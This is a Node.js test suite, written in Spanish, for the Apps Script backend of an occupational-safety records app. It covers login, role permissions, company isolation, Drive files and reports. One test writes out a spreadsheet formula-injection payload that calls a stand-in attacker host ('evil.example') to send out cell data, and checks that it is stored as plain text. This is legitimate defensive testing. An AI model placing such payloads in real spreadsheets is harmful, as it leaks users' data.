/**
 * tools/test_appscript.js — pruebas del backend Apps Script (00_Config/Code.gs)
 * =========================================================================
 *   node tools/gen_appscript.js && node tools/test_appscript.js
 *   (o: npm run test:appscript)
 *
 * Ejecuta el Code.gs REAL sobre un simulador de Sheets/Drive (tools/gas_fake.js):
 * creación del proyecto, verificación, login, permisos por rol (las mismas
 * reglas que el RLS de Supabase), archivos en DATA/<módulo>/<fecha>, detalle,
 * cuentas y configuración.
 * =========================================================================
 */
const path = require('path');
const { cargarCodeGs } = require('./gas_fake');

let ok = 0, fallos = 0;
const log = (cond, msg) => { cond ? ok++ : fallos++; console.log((cond ? '  ✔ ' : '  ✘ ') + msg); };
const seccion = t => console.log('\n── ' + t);

const env = cargarCodeGs(path.join(__dirname, '..', '00_Config', 'Code.gs'));
const G = env.sandbox;
const api = req => JSON.parse(G.serverRouter(JSON.stringify(req)));
const PNG = 'data:image/png;base64,' + Buffer.from('89504e470d0a1a0a0000000d49484452', 'hex').toString('base64');
const PDF = 'data:application/pdf;base64,' + Buffer.from('%PDF-1.4 prueba').toString('base64');
const uuid = () => require('crypto').randomUUID();
const ESQ = env.ejecutar('ESQUEMA');

seccion('Creación del proyecto (_CrearProyecto)');
// El CONFIG del repositorio puede traer ya los IDs reales de quien desplegó
// el proyecto. La prueba parte siempre de uno SIN configurar: no debe
// depender de la carpeta de Drive de nadie.
env.ejecutar("CONFIG.ROOT_FOLDER_ID = ''; CONFIG.SPREADSHEET_ID = '';");
let error = '';
try { G._CrearProyecto(); } catch (e) { error = e.message; }
log(/ROOT_FOLDER_ID/.test(error), 'Sin carpeta configurada, pide completar CONFIG.ROOT_FOLDER_ID');

const raiz = env.nuevaCarpeta('SSOMA Cliente');
env.ejecutar(`CONFIG.ROOT_FOLDER_ID = 'https://drive.google.com/drive/folders/${raiz.getId()}?usp=sharing'`);
env.estado.activo = '';
try { G._CrearProyecto(); error = ''; } catch (e) { error = e.message; }
log(/propietario/.test(error), 'Un visitante anónimo de la app web NO puede ejecutar _CrearProyecto');
env.estado.activo = env.estado.propietario;

const rep = G._CrearProyecto();
const sheetId = env.props.MOTOR_SPREADSHEET_ID;
const libro = env.SpreadsheetApp.openById(sheetId);
log(!!sheetId && env.archivos[sheetId].padres[0] === raiz.getId(), 'Sheet creada DENTRO de la carpeta raíz (acepta URL además de ID)');
const esperadas = [ESQ.usuarios.hoja].concat(...Object.keys(ESQ.modulos).map(k => [ESQ.modulos[k].hoja, ESQ.modulos[k].hojaHija].filter(Boolean)), ['_CONFIG', '_AUDITORIA']);
const hojas = libro.getSheets().map(h => h.getName());
log(esperadas.every(n => hojas.indexOf(n) !== -1) && hojas.indexOf('Hoja 1') === -1,
    esperadas.length + ' pestañas creadas, sin la "Hoja 1" vacía');
const petar = libro.getSheetByName('08_PETAR');
log(petar.getRange(1, 1, 1, petar.getLastColumn()).getValues()[0].join(',') === ESQ.modulos['08_PETAR'].campos.join(','),
    'Encabezados de 08_PETAR completos (' + ESQ.modulos['08_PETAR'].campos.length + ' columnas, más de las 26 por defecto)');
log(libro.getSheetByName('05_Incidentes__ACCIONES').getRange(1, 1).getValues()[0][0] === 'PARENT_UUID', 'Pestaña de detalle con PARENT_UUID');
const data = raiz.getFoldersByName('DATA').next();
const subs = [];
const it = data.getFolders(); while (it.hasNext()) subs.push(it.next().getName());
log(subs.length === 1 + Object.keys(ESQ.modulos).length && subs.indexOf('08_PETAR') !== -1, 'DATA/ con una carpeta por módulo (' + subs.length + ')');
const usuariosHoja = libro.getSheetByName('01_Usuarios');
log(usuariosHoja.getLastRow() === 2, 'Administrador inicial creado');

const rep2 = G._CrearProyecto();
log(libro.getSheets().length === hojas.length && usuariosHoja.getLastRow() === 2 &&
    rep2.lineas.some(l => /no se creó administrador/.test(l)), 'Re-ejecutar es idempotente: sin pestañas ni admin duplicados');

// Reparación: falta una columna
const inc = libro.getSheetByName('05_Incidentes');
inc.getRange(1, inc.getLastColumn(), 1, 1).setValues([['']]);
let ver = G._VerificarProyecto();
log(!ver.ok && ver.checks.some(c => c.estado === 'error' && /05_Incidentes/.test(c.nombre)), '_VerificarProyecto detecta la columna faltante');
G._CrearProyecto();
ver = G._VerificarProyecto();
log(ver.ok, '_CrearProyecto repara y _VerificarProyecto queda en verde');
log(ver.checks.some(c => c.nombre === 'Conectividad de la app' && c.estado === 'ok'), 'Verifica la conectividad de la aplicación web (/exec responde)');
log(ver.checks.some(c => c.nombre === 'Escritura en Drive' && c.estado === 'ok'), 'Prueba real de escritura en Drive');

seccion('API pública');
const ping = api({ action: 'PING' });
log(ping.status === 'OK' && ping.configurado && ping.backend === 'appscript', 'PING responde y reporta el proyecto configurado');
const viaPost = JSON.parse(G.doPost({ postData: { contents: JSON.stringify({ action: 'PING' }) } }).getContent());
log(viaPost.status === 'OK', 'doPost (app en Vercel) responde JSON');
log(JSON.parse(G.doGet({ parameter: {} }).getContent()).status === 'OK', 'doGet sin Index.html responde el estado en JSON');
log(api({ action: 'READ_DB', moduleName: '08_PETAR' }).status === 'INVALID_TOKEN', 'Sin sesión no se lee nada');
log(api({ action: 'NADA' }).status === 'ERROR', 'Acción desconocida rechazada');

seccion('Login');
log(api({ action: 'LOGIN_AUTH', userDNI: '00000000', password: 'mala123' }).msg === 'DNI o contraseña incorrectos.', 'Contraseña errada: mensaje genérico');
log(api({ action: 'LOGIN_AUTH', userDNI: '99999999', password: 'x' }).msg === 'DNI o contraseña incorrectos.', 'DNI inexistente: el MISMO mensaje (no revela quién existe)');
const login = (dni, pass) => api({ action: 'LOGIN_AUTH', userDNI: dni, password: pass });
const la = login('00000000', 'Cambiar2026');
log(la.status === 'OK' && la.userData.SessionToken && la.userData.Rol === 'Admin' && !('Password_Hash' in la.userData),
    'Admin inicial entra; recibe token y nunca el hash');
const tokA = la.userData.SessionToken;
const como = (token, req) => api(Object.assign({ userToken: token }, req));

seccion('Cuentas');
log(como(tokA, { action: 'CREATE_USER', datos: { DNI: '11112222', Nombre_Completo: 'X', Rol: 'Trabajador' }, password: 'corta' }).status === 'ERROR', 'Contraseña débil rechazada');
const crear = (dni, nombre, rol) => como(tokA, { action: 'CREATE_USER', datos: { DNI: dni, Nombre_Completo: nombre, Rol: rol, Foto_Perfil: PNG }, password: 'Segura2026' });
log(crear('00012345', 'Ana Supervisora', 'Supervisor').status === 'OK', 'Admin crea Supervisor (DNI con ceros iniciales)');
log(crear('33333333', 'Tomás Trabajador', 'Trabajador').status === 'OK', 'Admin crea Trabajador');
log(crear('44444444', 'Tere Trabajadora', 'Trabajador').status === 'OK', 'Admin crea otro Trabajador');
log(crear('55555555', 'Otro Admin', 'Admin').status === 'OK', 'Admin crea otro Admin');
log(crear('33333333', 'Duplicado', 'Trabajador').msg.indexOf('Ya existe') === 0, 'DNI duplicado rechazado');
log(crear('66666666', 'Proveedor', 'SuperAdmin').status === 'ERROR', 'Un Admin NO crea SuperAdmin');
const usuarios = como(tokA, { action: 'READ_DB', moduleName: '01_Usuarios' }).payload;
log(usuarios.some(u => u.DNI === '00012345'), 'El DNI conserva los ceros iniciales (columna en texto)');
log(usuarios.every(u => !('Password_Hash' in u)), 'El listado de usuarios nunca trae hashes');
const sup = login('00012345', 'Segura2026').userData, tra = login('33333333', 'Segura2026').userData, tra2 = login('44444444', 'Segura2026').userData;
const tokS = sup.SessionToken, tokT = tra.SessionToken, tokT2 = tra2.SessionToken;
log(como(tokT, { action: 'CREATE_USER', datos: { DNI: '77777777', Nombre_Completo: 'Y' }, password: 'Segura2026' }).status === 'ERROR', 'Un Trabajador NO crea cuentas');
log(como(tokT, { action: 'READ_DB', moduleName: '01_Usuarios' }).payload.length === 1, 'Un Trabajador solo se ve a sí mismo en Usuarios');
const fotoSup = usuarios.find(u => u.DNI === '00012345').Foto_Perfil;
log(/^drive:/.test(fotoSup), 'Foto de perfil guardada en Drive (' + fotoSup.slice(0, 30) + '…)');

seccion('Permisos por rol (matriz del subconfig)');
const sync = (token, mod, payload, hijos, id) => como(token, { action: 'SYNC_OFFLINE_QUEUE', moduleName: mod, items: [{ id: id || 1, payload, childPayload: hijos }] });
let r = sync(tokT, '07_IPERC', { UUID: 'IPC-T1', Proceso: 'x' });
log(r.status === 'ERROR' && /no puede crear/.test(r.fallos[0].msg) && r.fallos[0].transitorio === false, 'Trabajador NO crea IPERC (canCreate:false) y el rechazo no es transitorio');
r = sync(tokT, '08_PETAR', { UUID: 'PTR-T1', Estado: 'Solicitado', Supervisor_DNI: '00012345', Firma_Solicitante: PNG, Descripcion: '=IMPORTXML("https://evil.example/?"&A1,"//a")', Creado_Por_DNI: '00000000' },
         [{ Item: 'Arnés', Cumple: 'Sí' }, { Item: 'Línea de vida', Cumple: 'Sí' }], 77);
log(r.status === 'OK' && r.okIds[0] === 77, 'Trabajador crea PETAR con firma y detalle (responde okIds por elemento)');
const fila = como(tokA, { action: 'READ_DB', moduleName: '08_PETAR' }).payload.find(x => x.UUID === 'PTR-T1');
log(fila.Creado_Por_DNI === '33333333', 'La autoría la sella el servidor (ignora el Creado_Por_DNI enviado)');
log(fila.Descripcion.indexOf('=IMPORTXML') === 0 && !/#FORMULA/.test(JSON.stringify(petar.datos)), 'Un texto con "=" se guarda como texto, nunca como fórmula');
log(/^drive:[-\w]+\/Firma_Solicitante_0_PTR-T1_/.test(fila.Firma_Solicitante) && fila.Firma_Solicitante_ID && /^DATA\/08_PETAR\/\d{4}\/\d{2}\/\d{2}\//.test(fila.Firma_Solicitante_Path),
    'Firma en DATA/08_PETAR/aaaa/mm/dd/ (' + fila.Firma_Solicitante_Path.split('/').slice(0, 5).join('/') + ')');
log(fila.creado_por_dni === '33333333', 'Entrega alias creado_por_dni (como Supabase) para PERMISOS.filtrarDatos');
log(sync(tokT, '08_PETAR', { UUID: 'PTR-T1', Descripcion: 'cambio' }).status === 'ERROR', 'Trabajador NO edita su PETAR (canUpdate:false)');
r = sync(tokS, '08_PETAR', { UUID: 'PTR-S1', Estado: 'Solicitado', Ejecutante_DNI: '33333333' });
log(r.status === 'OK', 'Supervisor crea PETAR con el Trabajador como ejecutante');
log(sync(tokS, '08_PETAR', { UUID: 'PTR-S2', Estado: 'Aprobado', Aprobado_Por: '00012345' }).fallos[0].msg.indexOf('no puede aprobarlo') !== -1, 'Supervisor NO aprueba su propio PETAR');
log(sync(tokS, '08_PETAR', { UUID: 'PTR-T1', Estado: 'Aprobado', Aprobado_Por: '00012345' }).status === 'OK', 'Supervisor nombrado SÍ aprueba el PETAR del trabajador');
const verT = como(tokT, { action: 'READ_DB', moduleName: '08_PETAR' }).payload.map(x => x.UUID).sort().join(',');
const verT2 = como(tokT2, { action: 'READ_DB', moduleName: '08_PETAR' }).payload.length;
const verA = como(tokA, { action: 'READ_DB', moduleName: '08_PETAR' }).payload.length;
log(verT === 'PTR-S1,PTR-T1', 'Trabajador ve lo suyo y donde figura como ejecutante (' + verT + ')');
log(verT2 === 0, 'Otro Trabajador no ve nada ajeno');
log(verA === 2, 'Admin ve todo (' + verA + ')');

seccion('Detalle (tabla hija)');
let hijos = como(tokT, { action: 'READ_CHILDREN', moduleName: '08_PETAR', parentUuid: 'PTR-T1' }).payload;
log(hijos.length === 2 && hijos[0].Item === 'Arnés', 'READ_CHILDREN devuelve el detalle a quien ve el registro');
log(como(tokT2, { action: 'READ_CHILDREN', moduleName: '08_PETAR', parentUuid: 'PTR-T1' }).payload.length === 0, 'READ_CHILDREN vacío para quien no ve el registro');
log(sync(tokS, '08_PETAR', { UUID: 'PTR-T1', Estado: 'Aprobado' }, [{ Item: 'Casco', Cumple: 'Sí' }]).status === 'OK', 'Supervisor reemplaza el detalle');
hijos = como(tokA, { action: 'READ_CHILDREN', moduleName: '08_PETAR', parentUuid: 'PTR-T1' }).payload;
log(hijos.length === 1 && hijos[0].Item === 'Casco', 'El detalle queda exactamente con las filas nuevas');
log(sync(tokS, '08_PETAR', { UUID: 'PTR-T1' }, []).status === 'OK' &&
    como(tokA, { action: 'READ_CHILDREN', moduleName: '08_PETAR', parentUuid: 'PTR-T1' }).payload.length === 0, 'Vaciar el detalle funciona (sin el error de "borrar todas las filas")');

seccion('Archivos');
const ref = fila.Firma_Solicitante;
let arch = como(tokT, { action: 'GET_FILES', refs: [ref] }).archivos[ref];
log(/^data:image\/png;base64,/.test(arch), 'El dueño del registro recibe la firma (dataURL, sin hacer público el archivo)');
log(como(tokT2, { action: 'GET_FILES', refs: [ref] }).archivos[ref] === '', 'Otro trabajador NO puede descargarla');
log(como(tokT2, { action: 'GET_FILES', refs: [fotoSup] }).archivos[fotoSup] === '' && /^data:/.test(como(tokS, { action: 'GET_FILES', refs: [fotoSup] }).archivos[fotoSup]),
    'Foto de perfil: la ve el propio usuario, no un trabajador cualquiera');
r = sync(tokA, '09_EPP', { UUID: 'EPP-1', Foto_Cargo: PNG + ',' + PNG, Firma_Trabajador: PNG });
const epp1 = como(tokA, { action: 'READ_DB', moduleName: '09_EPP' }).payload[0];
sync(tokA, '09_EPP', { UUID: 'EPP-1', Foto_Cargo: PNG, Firma_Trabajador: '' });
const epp2 = como(tokA, { action: 'READ_DB', moduleName: '09_EPP' }).payload[0];
log(epp1.Foto_Cargo.split(',').length === 2 && epp2.Foto_Cargo.split(',').length === 3, 'Galería: las fotos nuevas se SUMAN a las anteriores');
log(epp2.Firma_Trabajador === epp1.Firma_Trabajador && !!epp2.Firma_Trabajador, 'Un campo de archivo vacío al editar NO borra la evidencia');
log(sync(tokA, '06_Capacitaciones', { UUID: 'CAP-1', Material: PDF }).status === 'OK', 'Acepta PDF en campos File');
log(sync(tokA, '06_Capacitaciones', { UUID: 'CAP-2', Material: 'data:text/html;base64,PHNjcmlwdD4=' }).fallos[0].msg.indexOf('no permitido') !== -1, 'Rechaza tipos no permitidos (text/html)');

seccion('Sincronización, cola y delta');
r = como(tokS, { action: 'SYNC_OFFLINE_QUEUE', moduleName: '04_Actos_Condiciones', items: [
  { id: 1, payload: { UUID: 'ACT-1', Descripcion: 'ok' } },
  { id: 2, payload: {} },
  { id: 3, payload: { UUID: 'ACT-3', Descripcion: 'ok' } }] });
log(r.status === 'PARTIAL' && r.okIds.join(',') === '1,3' && r.fallos[0].id === 2, 'Un lote con un registro inválido guarda el resto y señala cuál falló');
r = como(tokS, { action: 'SYNC_OFFLINE_QUEUE', moduleName: '04_Actos_Condiciones', dataArray: [{ UUID: 'ACT-LEG', Descripcion: 'formato antiguo' }] });
log(r.status === 'OK', 'Sigue aceptando el formato antiguo de la cola (dataArray)');
const delta = como(tokS, { action: 'READ_DELTA', moduleName: '04_Actos_Condiciones', lastSyncDate: new Date(Date.now() - 60000).toISOString() });
log(delta.payload.length === 3, 'READ_DELTA trae lo nuevo o editado (' + delta.payload.length + ')');

seccion('Informe PDF del registro (DATA/<modulo>/00_Informes)');
const pdf64 = Buffer.from('%PDF-1.4 informe de prueba').toString('base64');
const informe = (token, mod, uuid, b64) => como(token, { action: 'SAVE_REPORT', moduleName: mod, uuid, pdfBase64: b64 === undefined ? pdf64 : b64 });
log(informe(tokT2, '08_PETAR', 'PTR-T1').status === 'ERROR', 'Quien no ve el registro NO archiva su informe');
r = informe(tokT, '08_PETAR', 'PTR-T1');
log(r.status === 'OK' && /^drive:/.test(r.ruta), 'El autor archiva el informe de su registro aunque no pueda editarlo');
const infId = r.fileId;
log(env.archivos[infId].nombre === 'PTR-T1.pdf' && env.archivos[infId].mime === 'application/pdf',
    'Se guarda como <uuid>.pdf');
const carpInf = env.carpetas[env.archivos[infId].padres[0]];
log(carpInf.ruta().endsWith('DATA/08_PETAR/00_Informes'), 'En DATA/08_PETAR/00_Informes (' + carpInf.ruta().split('/').slice(-3).join('/') + ')');
log(informe(tokA, '08_PETAR', 'NO-EXISTE').status === 'ERROR', 'No se archiva un informe sin registro');
log(informe(tokA, '08_PETAR', 'PTR-T1', '').status === 'ERROR', 'Un informe vacío se rechaza');
// Utilities.base64Decode es permisivo (ignora caracteres fuera del alfabeto
// en vez de lanzar), así que la única defensa real es mirar la firma %PDF.
log(informe(tokA, '08_PETAR', 'PTR-T1', Buffer.from('esto no es un PDF').toString('base64')).msg.indexOf('no es un PDF válido') !== -1,
    'Un archivo que decodifica bien pero no empieza con %PDF se rechaza (no pisa el informe bueno)');
log(env.archivos[infId].papelera === false, 'Y el informe anterior sigue vigente tras el intento fallido');

// Cambiar el registro vuelve a archivar: el archivo anterior va a la papelera
r = informe(tokS, '08_PETAR', 'PTR-T1', Buffer.from('%PDF-1.4 version 2').toString('base64'));
log(r.status === 'OK' && r.fileId !== infId, 'Al cambiar el registro se archiva el informe nuevo');
log(env.archivos[infId].papelera === true, 'Y el anterior va a la papelera (recuperable, no destruido)');
const vigentes = [];
{ const it2 = carpInf.getFiles(); while (it2.hasNext()) vigentes.push(it2.next().getName()); }
log(vigentes.filter(n => n === 'PTR-T1.pdf').length === 1, 'Queda UN informe vigente por registro, no una copia por edición');

// Consulta y enlace para enviar
let info = como(tokT, { action: 'GET_REPORT', moduleName: '08_PETAR', uuid: 'PTR-T1' });
log(info.status === 'OK' && info.existe === true && !!info.enlace && !!info.fecha, 'GET_REPORT dice que existe, desde cuándo y con qué enlace');
log(como(tokT2, { action: 'GET_REPORT', moduleName: '08_PETAR', uuid: 'PTR-T1' }).status === 'ERROR', 'Quien no ve el registro no consulta su informe');
log(como(tokA, { action: 'GET_REPORT', moduleName: '08_PETAR', uuid: 'PTR-S1' }).existe === false, 'Un registro sin informe responde existe:false');
const nuevoId = como(tokT, { action: 'GET_REPORT', moduleName: '08_PETAR', uuid: 'PTR-T1' }).fileId;
log(env.archivos[nuevoId].getSharingAccess() === 'PRIVATE', 'Consultar NO comparte el archivo');
info = como(tokT, { action: 'GET_REPORT', moduleName: '08_PETAR', uuid: 'PTR-T1', compartir: true });
log(env.archivos[nuevoId].getSharingAccess() === 'ANYONE_WITH_LINK' && env.archivos[nuevoId].getSharingPermission() === 'VIEW',
    'Enviar por WhatsApp sí lo abre por enlace, solo lectura');
const audit = libro.getSheetByName('_AUDITORIA').getDataRange().getValues().map(f => f.join('|'));
log(audit.some(l => /INFORME_COMPARTIDO\|08_PETAR\|PTR-T1/.test(l)), 'Y queda en la auditoría quién lo compartió');
log(audit.some(l => /\|INFORME\|08_PETAR\|PTR-T1/.test(l)), 'El archivado también queda registrado');

seccion('Eliminar');
log(como(tokS, { action: 'DELETE_ROWS', moduleName: '08_PETAR', uuids: ['PTR-S1'] }).status === 'ERROR', 'Supervisor NO elimina (canDelete:false)');
const nArch = Object.keys(env.archivos).length;
r = como(tokA, { action: 'DELETE_ROWS', moduleName: '08_PETAR', uuids: ['PTR-T1'] });
log(r.status === 'OK' && como(tokA, { action: 'READ_DB', moduleName: '08_PETAR' }).payload.length === 1, 'Admin elimina el registro (y su detalle)');
log(Object.keys(env.archivos).length === nArch && !env.archivos[ref.slice(6).split('/')[0]].papelera, 'Los archivos de evidencia se conservan en Drive');
log(env.archivos[nuevoId].papelera === true, 'El informe PDF sí se retira: un documento oficial no sobrevive a su registro');
log(como(tokA, { action: 'GET_REPORT', moduleName: '08_PETAR', uuid: 'PTR-T1' }).status === 'ERROR', 'Y ya no se puede consultar (el registro no existe)');
log(como(tokA, { action: 'DELETE_REPORT', moduleName: '08_PETAR', uuid: 'PTR-T1' }).status === 'OK', 'Pedir borrarlo otra vez no da error (ya no hay nada)');

seccion('Configuración de la empresa');
log(como(tokS, { action: 'SAVE_CONFIG', config: { App_Nombre: 'X' } }).status === 'ERROR', 'Supervisor NO cambia la configuración');
log(como(tokA, { action: 'SAVE_CONFIG', config: { App_Nombre: 'SSOMA Andina', Color_Primario: '#0f766e' } }).config.App_Nombre === 'SSOMA Andina', 'Admin guarda la configuración');
log(login('00000000', 'Cambiar2026').userData.EmpresaConfig.Color_Primario === '#0f766e', 'La configuración llega con el login (para toda la empresa)');

seccion('Visibilidad de módulos por rol');
const charlaT = () => sync(tokT, '10_Charlas', { UUID: 'CHL-VIS-' + Math.random().toString(36).slice(2, 7), Tema: 'x' });
log(charlaT().status === 'OK', 'Trabajador registra una charla (módulo visible)');
const charlasT = () => como(tokT, { action: 'READ_DB', moduleName: '10_Charlas' }).payload.length;
const antes = charlasT();
log(antes > 0, 'Trabajador ve sus charlas (' + antes + ')');
log(como(tokA, { action: 'SAVE_CONFIG', config: { Modulos_Visibles: { '10_Charlas': { trabajador: false } } } }).status === 'OK', 'Admin oculta Charlas a los Trabajadores');
log(charlasT() === 0, 'Oculto: el Trabajador no lo lee por la API');
log(charlaT().status !== 'OK', 'Oculto: el Trabajador NO escribe');
log(como(tokS, { action: 'READ_DB', moduleName: '10_Charlas' }).status === 'OK', 'El Supervisor sigue teniendo acceso');
log(como(tokA, { action: 'SAVE_CONFIG', config: { Modulos_Visibles: {} } }).status === 'OK' && charlasT() === antes, 'Admin vuelve a mostrarlo y todo reaparece');
log(como(tokA, { action: 'SAVE_CONFIG', config: { x: 'y'.repeat(70000) } }).status === 'ERROR', 'Config de más de 64 KB: rechazada');

seccion('Contraseñas, cese y sesión');
log(como(tokA, { action: 'CHANGE_PASSWORD', uuid: login('55555555', 'Segura2026').userData.UUID, password: 'Nueva2026x' }).status === 'ERROR', 'Admin NO cambia la contraseña de otro Admin');
log(como(tokA, { action: 'CHANGE_PASSWORD', uuid: tra.UUID, password: 'Nueva2026x' }).status === 'OK', 'Admin restablece la contraseña de un trabajador');
log(como(tokT, { action: 'READ_DB', moduleName: '08_PETAR' }).status === 'INVALID_TOKEN', 'La sesión abierta con la contraseña anterior queda invalidada');
log(login('33333333', 'Nueva2026x').status === 'OK', 'El trabajador entra con la nueva');
const tok2 = login('44444444', 'Segura2026').userData.SessionToken;
log(sync(tokA, '01_Usuarios', { UUID: tra2.UUID, DNI: '44444444', Status: 'Cesado' }).status === 'OK', 'Admin cesa a un trabajador (edición de perfil por la cola)');
log(como(tok2, { action: 'READ_DB', moduleName: '08_PETAR' }).status === 'FORCE_LOGOUT', 'Su sesión abierta se corta en la siguiente petición');
log(login('44444444', 'Segura2026').status === 'CESADO', 'Y ya no puede volver a entrar');
log(sync(tokA, '01_Usuarios', { UUID: la.userData.UUID, DNI: '00000000', Rol: 'Trabajador' }).fallos[0].msg.indexOf('propio rol') !== -1, 'Nadie cambia su propio rol');
log(sync(tokA, '01_Usuarios', { UUID: sup.UUID, DNI: '99990000' }).status === 'ERROR', 'El DNI de una cuenta no se cambia');
for (let i = 0; i < 8; i++) login('55555555', 'mal');
log(/Demasiados intentos/.test(login('55555555', 'Segura2026').msg), 'Bloqueo temporal tras 8 intentos fallidos');
log(como(tokS, { action: 'LOGOUT' }).status === 'OK' && como(tokS, { action: 'READ_DB', moduleName: '08_PETAR' }).status === 'INVALID_TOKEN', 'LOGOUT invalida el token en el servidor');

seccion('Alcance por empresa contratista');
// Dos contratistas distintas, cada una con su Admin y su Supervisor.
log(como(tokA, { action: 'CREATE_USER', datos: { DNI: '60000001', Nombre_Completo: 'Admin AESA', Rol: 'Admin', Empresa: 'AESA' }, password: 'Segura2026' }).status === 'OK', 'Alta de un Admin con empresa AESA');
log(como(tokA, { action: 'CREATE_USER', datos: { DNI: '60000002', Nombre_Completo: 'Admin Zicsa', Rol: 'Admin', Empresa: 'ZICSA' }, password: 'Segura2026' }).status === 'OK', 'Alta de un Admin con empresa ZICSA');
const tokAE = login('60000001', 'Segura2026').userData.SessionToken;
const tokZI = login('60000002', 'Segura2026').userData.SessionToken;

// Un Admin con empresa solo da de alta en la SUYA, diga lo que diga el cliente
log(como(tokAE, { action: 'CREATE_USER', datos: { DNI: '60000003', Nombre_Completo: 'Peon AESA', Rol: 'Trabajador', Empresa: 'ZICSA' }, password: 'Segura2026' }).status === 'OK', 'El Admin de AESA crea una cuenta pidiendo ZICSA…');
const empDe = dni => env.ejecutar(`_MEMO.tablas = {}; filaAObjeto_(leerTabla_("01_Usuarios"), leerTabla_("01_Usuarios").filas[buscarFila_(leerTabla_("01_Usuarios"), "DNI", "${dni}")]).Empresa`);
log(empDe('60000003') === 'AESA', '…y el servidor la sella en AESA (la empresa de quien la crea)');

// Registros: se sellan con la empresa del creador y no se cruzan
const pAE = uuid(), pZI = uuid();
log(sync(tokAE, '04_Actos_Condiciones', { UUID: pAE, Tipo_Reporte: 'Acto', Descripcion: 'de AESA', Estado: 'Pendiente' }).status === 'OK', 'El Admin de AESA registra un acto');
log(sync(tokZI, '04_Actos_Condiciones', { UUID: pZI, Tipo_Reporte: 'Acto', Descripcion: 'de ZICSA', Estado: 'Pendiente' }).status === 'OK', 'El Admin de ZICSA registra otro');
const verActos = t => como(t, { action: 'READ_DB', moduleName: '04_Actos_Condiciones' }).payload.map(r => r.UUID);
log(verActos(tokAE).indexOf(pAE) !== -1 && verActos(tokAE).indexOf(pZI) === -1, 'AESA ve el suyo y NO el de ZICSA');
log(verActos(tokZI).indexOf(pZI) !== -1 && verActos(tokZI).indexOf(pAE) === -1, 'ZICSA ve el suyo y NO el de AESA');
log(verActos(tokA).indexOf(pAE) !== -1 && verActos(tokA).indexOf(pZI) !== -1, 'El Admin sin empresa (instalación anterior) sigue viéndolo todo');

// Escritura cruzada: ni editar ni borrar lo de la otra empresa
log(sync(tokZI, '04_Actos_Condiciones', { UUID: pAE, Descripcion: 'secuestrado' }).fallos[0].msg.indexOf('permiso') !== -1, 'ZICSA no puede EDITAR el registro de AESA');
log(como(tokZI, { action: 'DELETE_ROWS', moduleName: '04_Actos_Condiciones', uuids: [pAE] }).status === 'ERROR', 'ZICSA no puede BORRAR el registro de AESA');
log(env.ejecutar(`_MEMO.tablas = {}; filaAObjeto_(leerTabla_("04_Actos_Condiciones"), leerTabla_("04_Actos_Condiciones").filas[buscarFila_(leerTabla_("04_Actos_Condiciones"), "UUID", "${pAE}")]).Descripcion`) === 'de AESA', 'El registro de AESA quedó intacto');

// Personal: listado, contraseñas y traslados entre empresas
const dnisQueVe = t => como(t, { action: 'READ_DB', moduleName: '01_Usuarios' }).payload.map(u => String(u.DNI));
log(dnisQueVe(tokAE).indexOf('60000003') !== -1 && dnisQueVe(tokAE).indexOf('60000002') === -1, 'El Admin de AESA ve a su gente, no al Admin de ZICSA');
log(como(tokZI, { action: 'CHANGE_PASSWORD', uuid: '60000003', password: 'Robada2026' }).msg.indexOf('otra empresa') !== -1, 'ZICSA no restablece la contraseña de alguien de AESA');
log(sync(tokZI, '01_Usuarios', { DNI: '60000003', Nombre_Completo: 'Secuestrado' }).fallos[0].msg.indexOf('otra empresa') !== -1, 'ZICSA no edita la ficha de alguien de AESA');
log(sync(tokAE, '01_Usuarios', { DNI: '60000003', Empresa: 'ZICSA' }).fallos[0].msg.indexOf('proveedor del servicio') !== -1, 'Un Admin no mueve a su gente a otra empresa');
log(sync(tokA, '01_Usuarios', { DNI: '60000003', Empresa: 'ZICSA' }).status === 'OK' && empDe('60000003') === 'ZICSA', 'El proveedor (sin empresa) sí la traslada');
log(verActos(tokAE).indexOf(pAE) !== -1, 'Trasladar a alguien NO le quita a AESA los registros que ya tenía (la empresa se selló en el registro)');

// 08_PETAR tiene un campo 'Empresa' PROPIO (la contratista que ejecuta el
// trabajo). No debe confundirse con la columna de sistema Empresa_Registro.
const pPet = uuid();
log(sync(tokAE, '08_PETAR', { UUID: pPet, Tipo_Trabajo: 'Trabajo en caliente', Estado: 'Solicitado', Empresa: 'Contratista Andina SAC' }).status === 'OK', 'PETAR con su campo Empresa propio se guarda');
const filaPet = m => env.ejecutar(`_MEMO.tablas = {}; filaAObjeto_(leerTabla_("08_PETAR"), leerTabla_("08_PETAR").filas[buscarFila_(leerTabla_("08_PETAR"), "UUID", "${pPet}")]).${m}`);
log(filaPet('Empresa') === 'Contratista Andina SAC', 'El campo Empresa del formulario NO lo pisa el servidor');
log(filaPet('Empresa_Registro') === 'AESA', '…y la empresa dueña del registro se sella aparte, en Empresa_Registro');
log(ESQ.modulos['08_PETAR'].columnaEmpresa === 'Empresa_Registro' && ESQ.modulos['04_Actos_Condiciones'].columnaEmpresa === 'Empresa',
    'Solo 08_PETAR necesita Empresa_Registro; los demás módulos usan la columna Empresa');

seccion('Compatibilidad y diagnóstico desde la app');
const legacyHash = require('crypto').createHash('sha256').update('Legacy2026').digest('hex');
const tu = env.ejecutar('leerTabla_("01_Usuarios")');
env.ejecutar(`agregarFilas_(leerTabla_("01_Usuarios"), [objetoAFila_(leerTabla_("01_Usuarios"), { UUID: 'U-LEG', DNI: '88888888', Nombre_Completo: 'Antiguo', Rol: 'Trabajador', Status: 'Activo', Password_Hash: '${legacyHash}' })])`);
env.ejecutar('_MEMO.tablas = {}');
log(api({ action: 'LOGIN_AUTH', userDNI: '88888888', userPassHash: legacyHash }).status === 'OK', 'Usuario con hash antiguo (SHA-256 sin sal) entra');
env.ejecutar('_MEMO.tablas = {}');
log(/^v2\$/.test(env.ejecutar('filaAObjeto_(leerTabla_("01_Usuarios"), leerTabla_("01_Usuarios").filas[buscarFila_(leerTabla_("01_Usuarios"), "DNI", "88888888")]).Password_Hash')),
    '…y su hash se migra a v2 (con sal) al entrar');
const tokA2 = login('00000000', 'Cambiar2026').userData.SessionToken;
const diag = como(tokA2, { action: 'VERIFICAR_PROYECTO' });
log(diag.status === 'OK' && diag.checks.length > 8 && !diag.checks.some(c => c.estado === 'error'), 'VERIFICAR_PROYECTO (panel Admin) devuelve ' + diag.checks.length + ' comprobaciones en verde');
log(como(login('33333333', 'Nueva2026x').userData.SessionToken, { action: 'VERIFICAR_PROYECTO' }).status === 'ERROR', 'Un Trabajador NO ejecuta el diagnóstico');
const aud = libro.getSheetByName('_AUDITORIA').getLastRow() - 1;
log(aud > 10, 'Auditoría registrada en _AUDITORIA (' + aud + ' eventos)');
